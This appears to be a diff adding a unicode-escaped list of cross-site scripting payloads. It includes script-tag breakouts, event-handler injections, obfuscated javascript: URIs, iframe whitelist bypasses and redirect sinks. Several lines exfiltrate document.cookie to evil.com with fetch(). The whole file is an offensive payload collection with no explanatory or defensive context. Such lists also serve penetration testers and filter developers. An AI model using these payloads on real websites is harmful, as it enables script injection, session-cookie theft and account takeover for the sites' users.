+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript \u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript  \u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript random\u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript
+random\u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript
+random\u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u003cscript\u003e
+  var test \u003d \u0022\u003c\u002fscript \u003cimg\u003e\u003csvg\u002fonload\u003dalert\u002845\u0029\u003e\u0022
+\u003c\u002fscript\u003e
+\u0027\u002dalert\u00281\u0029\u002d\u0027
+\u0022\u002dalert\u00281\u0029\u002d\u0022
+\u0029\u003balert\u00281\u0029\u002f\u002f
+\u0027\u003balert\u00281\u0029\u002f\u002f
+\u0022\u003balert\u00281\u0029\u002f\u002f
+\u0022\u003e\u003cimg\u002fsrc\u002fonerror\u003dalert\u00281\u0029\u003e\u002f\u002f
+\u0027\u003e\u003cimg\u002fsrc\u002fonerror\u003dalert\u00281\u0029\u003e\u002f\u002f
+\u003e\u0022\u0040input\u003d\u0022this\u002ealert\u00601\u0060
+\u003e\u0027\u0040input\u003d\u0027this\u002ealert\u00601\u0060
+\u0026quot onerror\u003d\u0027alert\u00281\u0029\u0027
+\u0022 onerror\u003d\u0027alert\u00281\u0029\u0027
+\u003csvg\u002fonload\u003d\u0027alert\u0026\u002340 23 \u0026\u002341\u0027\u003e
+location\u003d\u002fjavascript\u003aalert\u00252823\u002529\u002f\u002esource\u003b
+\u003cimg\u002fsrc\u002fonerror\u003dalert\u00281\u0029\u003e
+\u003csvg\u002fonload\u003dalert\u00281\u0029\u003e
+\u003cobject\u002fdata\u003djavascript\u003aprompt\u00281\u0029\u003e
+\u003cinput\u002fautofocus\u002fonfocus\u003dprompt\u00281\u0029\u003e
+\u003caudio\u002fsrc\u002fonloadstart\u003dalert\u00281\u0029\u003e
+\u003csvg\u003e\u003canimate\u002fonbegin\u003dalert\u00281\u0029\u003e
+\u003csvg\u003e\u003canimate\u002fdur\u003d\u00271s\u0027onend\u003dalert\u00281\u0029\u003e
+\u003csvg\u003e\u003cset\u002fonbegin\u003dalert\u00281\u0029\u003e
+\u003csvg\u003e\u003cset\u002fdur\u003d\u00271ms\u0027onend\u003dalert\u00281\u0029\u003e
+\u003cmarquee width\u003d1 loop\u003d1 onfinish\u003dalert\u00281\u0029\u003e
+\u003cdetails\u002fopen\u002fontoggle\u003dconfirm\u00281\u0029\u003e
+\u003cdetails open ontoggle\u003dconfirm\u00281\u0029\u003e
+\u003cdetails\u002fontoggle\u003d\u0027alert\u00281\u0029\u0027\u002fopen\u003e
+\u003cdetails ontoggle\u003dalert\u00281\u0029 open\u003e
+\u003cscript src\u003d\u002f\u002f0x8ac5c30a\u003e
+\u003ciframe src\u003d\u0022javascript\u003aalert\u0028\u0027steven\u0027\u0029\u0022\u003e \u0023use href bypass
+\u003ciframe src\u003d\u0022https\u003a\u002f\u002fyoutube\u002ecom\u002eevil\u002edomain\u002f \u0022\u003e \u0023 if youtube is whitelisted for example
+\u003ciframe src\u003d\u0022https\u003a\u002f\u002fgoogle\u002ecom\u0040evil\u002edomain\u0022\u003e
+\u003ciframe src\u003d\u0022data\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg\u003d\u003d\u0022\u003e \u0023 base64 \u003cscript\u003ealert\u00281\u0029\u003c\u002fscript\u003e
+test\u002b\u0028\u003cscript\u003ealert\u00280\u0029\u003c\u002fscript\u003e\u0029\u0040example\u002ecom
+test\u0040example\u0028\u003cscript\u003ealert\u00280\u0029\u003c\u002fscript\u003e\u0029\u002ecom
+\u0022\u003cscript\u003ealert\u00280\u0029\u003c\u002fscript\u003e\u0022\u0040example\u002ecom
+\u0028 \u002d\u003e \u0026\u0023x28\u003b \u003d \u0026\u0023x0000028\u003b
+\u0028 \u002d\u003e \u0026\u002340\u003b \u003d \u0026\u00230000000000040\u003b
+\u003c\u0021\u002d\u002djavascript \u002d\u002d\u003e
+javascript\u003aalert\u00281\u0029
+JaVaScript\u003aalert\u00281\u0029
+ja\u0026Tab\u003bvascript\u003aalert\u00281\u0029
+java\u005ctscript\u003aalert\u00281\u0029
+ja\u0026NewLine\u003bvascript\u003aalert\u00281\u0029
+ja\u0026\u0023x0000A\u003bvascript\u003aalert\u00281\u0029
+java\u0026\u0023x73\u003bcript\u003aalert\u0028\u0029
+\u0026\u0023106\u003b\u0026\u002397\u003b\u0026\u0023118\u003b\u0026\u002397\u003b\u0026\u0023115\u003b\u0026\u002399\u003b\u0026\u0023114\u003b\u0026\u0023105\u003b\u0026\u0023112\u003b\u0026\u0023116\u003b\u0026\u002358\u003balert\u0028\u0027steven\u0027\u0029
+javascript\u003aalert\u00281\u0029
+jav     asc     ript    \u003aalert\u00281\u0029
+javascript\u0026colon\u003balert\u0028\u0029
+javascript\u0026\u0023x0003A\u003balert\u0028\u0029
+javascript\u0026\u002358\u003balert\u00281\u0029
+javascript\u0026\u0023x3A\u003balert\u0028\u0029
+javascript\u003a\u002f\u002f\u00250Aalert\u00281\u0029
+javascript\u003a\u002f\u002f\u00250Dalert\u00281\u0029
+javascript\u003aalert\u0026lpar\u003b\u0026rpar\u003b
+javascript\u003aal\u0026\u0023x65\u003brt\u0060\u0060
+javascript\u003aalert\u002560\u002560
+javascript\u003ax\u003d\u0027\u002527\u002dalert\u00281\u0029\u002d\u002527\u0027\u003b
+javascript\u003a\u002561\u00256c\u002565\u002572\u002574\u002528\u002529
+javascript\u003aa\u005cu006Cert\u0060\u0060\u0022
+javascript\u003a\u005cu0061\u005cu006C\u005cu0065\u005cu0072\u005cu0074\u0060\u0060
+fetch\u0028\u0022\u002f\u002fevil\u002ecom\u002f\u003fc\u003d\u0022\u002bdocument\u002ecookie\u0029
+fetch\u0028\u0022\u002f\u002fevil\u002ecom\u002f\u003fc\u003d\u0022\u002econcat\u0028document\u002ecookie\u0029\u0029
+fetch\u0028\u0022\u002f\u002fevil\u002ecom\u002f\u003fc\u003d\u0022\u002c document\u002ecookie\u005d\u002ejoin\u0028\u0029\u0029
+fetch\u0028\u0060\u002f\u002fevil\u002ecom\u002f\u003fc\u003d\u0024{document\u002ecookie}\u0060\u0029
+document\u002ecookie
+document\u005b\u0027cookie\u0027\u005d
+with\u0028document\u0029alert\u0028cookie\u0029
+doc\u005cu0075ment\u002ecookie
+doc\u005cu0075ment\u005b\u0027cookie\u0027\u005d
+window\u005b\u0022doc\u0022\u002b\u0022ument\u0022\u005d\u005b\u0022cookie\u0022\u005d
+\u002f\u002fgoogle\u002ecom\u002f\u003f\u003da
+\u002f\u002f134744072\u003a1234\u002f\u003fa\u003dwindow\u005b\u0022doc\u0022\u002b\u0022ument\u0022\u005d\u005b\u0022cookie\u0022\u005d
+document\u002elocation\u003d
+document\u005b\u0027location\u0027\u005d\u003d
+window\u002elocation\u003d
+this\u005b\u0022window\u0022\u005d\u005b\u0022location\u0022\u005d\u003d
+document\u002elocation\u002ehref\u003d
+location\u002ehref\u003d
+location\u003d
+window\u002elocation\u002eassign\u0028\u0029
+window\u005b\u0027location\u0027\u005d\u005b\u0027href\u0027\u005d\u003d
+document\u002elocation\u002ereplace\u0028\u0029
+window\u002eopen\u0028\u0022link\u0022\u002c \u0022\u005fblank\u0022\u0029\u003b
